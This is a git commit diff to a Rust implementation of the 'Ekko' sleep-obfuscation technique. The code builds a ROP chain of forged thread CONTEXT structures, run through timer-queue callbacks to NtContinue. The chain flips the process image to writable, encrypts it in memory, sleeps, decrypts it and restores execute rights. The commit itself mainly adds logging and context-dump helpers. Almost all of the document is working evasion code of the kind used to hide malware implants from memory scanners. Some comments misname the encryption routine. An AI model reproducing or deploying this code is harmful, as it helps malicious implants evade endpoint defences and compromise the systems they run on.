b6e6be9f355946a527fe47016cf60854d64f21d0
memN0ps <89628341+memN0ps@users.noreply.github.com>
2023-03-11 17:09:38 +1300

    Added functionality for dumping CONTEXT structure.

--- src/ekko.rs
+++ src/ekko.rs
@@ -1,15 +1,11 @@
-use std::{
-    ffi::c_void,
-    mem::{zeroed},
-    ptr::{null_mut},
-};
 use ntapi::winapi::um::errhandlingapi::GetLastError;
+use std::{ffi::c_void, mem::zeroed, ptr::null_mut};
 use windows_sys::Win32::{
     Foundation::{HANDLE, UNICODE_STRING},
     System::{
         Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
         LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
-        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
+        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
         SystemServices::IMAGE_DOS_HEADER,
         Threading::{
             CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue, SetEvent,
@@ -38,10 +34,12 @@ pub fn ekko(sleep_time: u32) {
     // Creates or opens a named or unnamed event object.
     // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw
     let h_event = unsafe { CreateEventW(null_mut(), 0, 0, null_mut()) };
+    log::info!("[+] h_event: {:#x}", h_event);
 
     // Creates a queue for timers. Timer-queue timers are lightweight objects that enable you to specify a callback function to be called at a specified time.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueue
     let h_timer_queue = unsafe { CreateTimerQueue() };
+    log::info!("[+] h_timer_queue: {:#x}", h_timer_queue);
 
     let nt_continue = unsafe {
         GetProcAddress(
@@ -85,7 +83,7 @@ pub fn ekko(sleep_time: u32) {
     log::info!("[+] Calling CreateTimerQueueTimer with ctx_thread");
     // Creates a timer-queue timer. This timer expires at the specified due time, then after every specified period. When the timer expires, the callback function is called.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-createtimerqueuetimer
-    let success = unsafe {
+    let result = unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
@@ -97,156 +95,198 @@ pub fn ekko(sleep_time: u32) {
         )
     };
 
-    if success != 0 {
-        unsafe {
-            log::info!("[+] Calling WaitForSingleObject for 0x32 ms");
-            // Waits until the specified object is in the signaled state or the time-out interval elapses.
-            // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
-            WaitForSingleObject(h_event, 0x32);
-        }
-
-        log::info!("[+] Copying ctx_thread to rop chains");
-        let mut rop_prot_rw = ctx_thread.clone();
-        let mut rop_mem_enc = ctx_thread.clone();
-        let mut rop_delay = ctx_thread.clone();
-        let mut rop_mem_dec = ctx_thread.clone();
-        let mut rop_prot_rx = ctx_thread.clone();
-        let mut rop_set_evt = ctx_thread.clone();
-
-        log::info!("[+] Building ROP chain");
-        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
-        rop_prot_rw.Rsp = -8 as isize as u64;
-        rop_prot_rw.Rip = VirtualProtect as u64;
-        rop_prot_rw.Rcx = image_base as u64;
-        rop_prot_rw.Rdx = image_size as u64;
-        rop_prot_rw.R8 = PAGE_READWRITE as u64;
-        rop_prot_rw.R9 = &mut old_protect as *mut u32 as u64;
-
-        // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
-        rop_mem_enc.Rsp = -8 as isize as u64;
-        rop_mem_enc.Rip = sys_func032.unwrap() as u64;
-        rop_mem_enc.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
-        rop_mem_enc.Rdx = key.Length as u64;
-
-        // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.WaitForSingleObject.html
-        rop_delay.Rsp = -8 as isize as u64;
-        rop_delay.Rip = WaitForSingleObject as u64;
-        rop_delay.Rcx = -1 as isize as u64; // NtCurrentProcess
-        rop_delay.Rdx = sleep_time as u64;
-
-        // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
-        rop_mem_dec.Rsp = -8 as isize as u64;
-        rop_mem_dec.Rip = sys_func032.unwrap() as u64;
-        rop_mem_dec.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
-        rop_mem_dec.Rdx = key.Length as u64;
-
-        // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
-        rop_prot_rx.Rsp = -8 as isize as u64;
-        rop_prot_rx.Rip = VirtualProtect as u64;
-        rop_prot_rx.Rcx = image_base as u64;
-        rop_prot_rx.Rdx = image_size as u64;
-        rop_prot_rx.R8 = PAGE_EXECUTE_READ as u64;
-        rop_prot_rw.R9 = &mut old_protect as *mut u32 as u64;
-
-        // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.SetEvent.html
-        // pub unsafe extern "system" fn SetEvent(hevent: HANDLE) -> BOOL
-        rop_set_evt.Rsp = -8 as isize as u64;
-        rop_set_evt.Rip = SetEvent as u64;
-        rop_set_evt.Rcx = h_event as u64;
-
-        log::info!("[+] Rop chain built");
-        log::info!("[+] Queue timers");
-        unsafe {
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_prot_rw as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_prot_rw (VirtualProtect RW) {:#x}", GetLastError());
-            }
-
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_mem_enc as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_mem_enc (SystemFunction036) {:#x}", GetLastError());
-            }
-
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_delay as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_delay (WaitForSingleObject) {:#x}", GetLastError());
-            }
-
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_mem_dec as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_mem_dec (SystemFunction036) {:#x}", GetLastError());
-            }
-
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_prot_rx as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_prot_rx (VirtualProtect RX) {:#x}", GetLastError());
-            }
-
-            let result = CreateTimerQueueTimer(
-                &mut h_new_timer,
-                h_timer_queue,
-                std::mem::transmute(nt_continue),
-                &rop_set_evt as *const _ as *const _,
-                100,
-                0,
-                WT_EXECUTEINTIMERTHREAD,
-            );
-            if result == 0 {
-                panic!("[!] Failed calling CreateTimerQueueTimer with rop_set_evt (SetEvent) {:#x}", GetLastError());
-            }
-            
-            log::info!("[+] Waiting for event...");
-
-            WaitForSingleObject(h_event, INFINITE); //0xFFFFFFFF
-
-            log::info!("[+] Finished waiting for event");
-        }
+    if result == 0 {
+        panic!("[!] CreateTimerQueueTimer failed with error: {}", unsafe {
+            GetLastError()
+        });
     }
+
+    log::info!("[+] Calling WaitForSingleObject for 0x32 ms");
+    // Waits until the specified object is in the signaled state or the time-out interval elapses.
+    // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
+    unsafe {
+        WaitForSingleObject(h_event, 0x32);
+    }
+
+    log::info!("[+] Copying ctx_thread to rop chains");
+    let mut rop_prot_rw = ctx_thread.clone();
+    let mut rop_mem_enc = ctx_thread.clone();
+    let mut rop_delay = ctx_thread.clone();
+    let mut rop_mem_dec = ctx_thread.clone();
+    let mut rop_prot_rx = ctx_thread.clone();
+    let mut rop_set_evt = ctx_thread.clone();
+
+    log::info!("[+] Building ROP chain");
+    // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
+    rop_prot_rw.Rsp = -8 as isize as u64;
+    rop_prot_rw.Rip = VirtualProtect as u64;
+    rop_prot_rw.Rcx = image_base as u64;
+    rop_prot_rw.Rdx = image_size as u64;
+    rop_prot_rw.R8 = PAGE_READWRITE as u64;
+    rop_prot_rw.R9 = &mut old_protect as *mut PAGE_PROTECTION_FLAGS as u64;
+    dump_virtual_protect_context(&rop_prot_rw);
+    
+    // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
+    rop_mem_enc.Rsp = -8 as isize as u64;
+    rop_mem_enc.Rip = sys_func032.unwrap() as u64;
+    rop_mem_enc.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
+    rop_mem_enc.Rdx = key.Length as u64;
+    dump_system_function036_context(&rop_mem_enc);
+
+    // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.WaitForSingleObject.html
+    rop_delay.Rsp = -8 as isize as u64;
+    rop_delay.Rip = WaitForSingleObject as u64;
+    rop_delay.Rcx = -1 as isize as u64; // NtCurrentProcess
+    rop_delay.Rdx = sleep_time as u64;
+    dump_wait_for_single_object_context(&rop_delay);
+
+    // pub unsafe extern "system" fn SystemFunction036(randombuffer: *mut c_void, randombufferlength: u32) -> BOOLEAN
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/Security/Authentication/Identity/fn.SystemFunction036.html
+    rop_mem_dec.Rsp = -8 as isize as u64;
+    rop_mem_dec.Rip = sys_func032.unwrap() as u64;
+    rop_mem_dec.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
+    rop_mem_dec.Rdx = key.MaximumLength as u64;
+    dump_system_function036_context(&rop_mem_dec);
+
+    // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Memory/fn.VirtualProtect.html
+    rop_prot_rx.Rsp = -8 as isize as u64;
+    rop_prot_rx.Rip = VirtualProtect as u64;
+    rop_prot_rx.Rcx = image_base as u64;
+    rop_prot_rx.Rdx = image_size as u64;
+    rop_prot_rx.R8 = PAGE_EXECUTE_READ as u64;
+    rop_prot_rx.R9 = &mut old_protect as *mut u32 as u64;
+    dump_virtual_protect_context(&rop_prot_rx);
+
+    // https://docs.rs/windows-sys/latest/windows_sys/Win32/System/Threading/fn.SetEvent.html
+    // pub unsafe extern "system" fn SetEvent(hevent: HANDLE) -> BOOL
+    rop_set_evt.Rsp = -8 as isize as u64;
+    rop_set_evt.Rip = SetEvent as u64;
+    rop_set_evt.Rcx = h_event as u64;
+    dump_set_event_context(&rop_set_evt);
+
+    log::info!("[+] Rop chain built");
+    log::info!("[+] Queue timers");
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_prot_rw as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_prot_rw (VirtualProtect RW) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_mem_enc as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_mem_enc (SystemFunction036) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_delay as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_delay (WaitForSingleObject) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_mem_dec as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_mem_dec (SystemFunction036) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_prot_rx as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_prot_rx (VirtualProtect RX) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    let result = unsafe {
+        CreateTimerQueueTimer(
+            &mut h_new_timer,
+            h_timer_queue,
+            std::mem::transmute(nt_continue),
+            &rop_set_evt as *const _ as *const _,
+            100,
+            0,
+            WT_EXECUTEINTIMERTHREAD,
+        )
+    };
+
+    if result == 0 {
+        panic!(
+            "[!] Failed calling CreateTimerQueueTimer with rop_set_evt (SetEvent) {:#x}",
+            unsafe { GetLastError() }
+        );
+    }
+
+    log::info!("[+] Waiting for event...");
+
+    unsafe {
+        WaitForSingleObject(h_event, INFINITE);
+    } //0xFFFFFFFF
+
+    log::info!("[+] Finished waiting for event");
 
     // Deletes a timer queue. Any pending timers in the queue are canceled and deleted.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-deletetimerqueue
@@ -270,4 +310,20 @@ pub fn pause() {
         Ok(buffer) => println!("{:?}", buffer),
         Err(error) => println!("error: {}", error),
     };
+}
+
+fn dump_virtual_protect_context(rop: &CONTEXT) {
+    log::info!("[+] RSP: {:#x} RIP: {:#x} -> VirtualProtect({:#x}, {:#x}, {:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx, rop.R8, rop.R9);
+}
+
+fn dump_system_function036_context(rop: &CONTEXT) {
+    log::info!("[+] RSP: {:#x} RIP: {:#x} -> SystemFunction036({:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx);
+}
+
+fn dump_wait_for_single_object_context(rop: &CONTEXT) {
+    log::info!("[+] RSP: {:#x} RIP: {:#x} -> WaitForSingleObject({:#x}, {:#x})" , rop.Rsp, rop.Rip, rop.Rcx, rop.Rdx);
+}
+
+fn dump_set_event_context(rop: &CONTEXT) {
+    log::info!("[+] RSP: {:#x} RIP: {:#x} -> SetEvent({:#x})" , rop.Rsp, rop.Rip, rop.Rcx);
 }
